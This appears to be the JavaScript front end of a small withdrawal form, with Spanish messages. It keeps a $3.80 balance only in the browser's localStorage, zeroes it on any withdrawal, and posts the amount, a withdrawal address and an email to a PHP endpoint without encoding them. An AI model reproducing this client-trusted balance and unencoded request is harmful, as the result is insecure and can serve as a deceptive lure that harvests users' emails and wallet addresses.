const initialBalance = 3.80;
let balance = parseFloat(localStorage.getItem('balance')) || initialBalance;

const balanceDisplay = document.getElementById('balance-display');
const messageDiv = document.getElementById('message');
const modal = document.getElementById('modal');

function updateBalanceDisplay() {
    balanceDisplay.textContent = 'Balance: $' + balance.toFixed(2);
}

function closeModal() {
    modal.classList.remove('show');
}

document.getElementById('withdraw-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const amount = parseFloat(document.getElementById('amount').value);
    const withdrawAddress = document.getElementById('withdraw-address').value;
    const email = document.getElementById('email').value;

    if (amount > balance) {
        messageDiv.textContent = 'Saldo insuficiente para realizar el retiro.';
    } else {
        balance = 0; // El balance se establece en cero después del retiro
        localStorage.setItem('balance', balance.toFixed(2));
        updateBalanceDisplay();
        messageDiv.textContent = '';

        // Mostrar el modal
        modal.classList.add('show');

        // Enviar datos al servidor
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'enviar.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                console.log(xhr.responseText);
                closeModal();
            } else if (xhr.readyState == 4) {
                messageDiv.textContent = 'Error al procesar el retiro. Por favor, intente nuevamente.';
                closeModal();
            }
        };
        xhr.send(`amount=${amount}&withdraw-address=${withdrawAddress}&email=${email}`);
    }
});

window.addEventListener('load', updateBalanceDisplay);
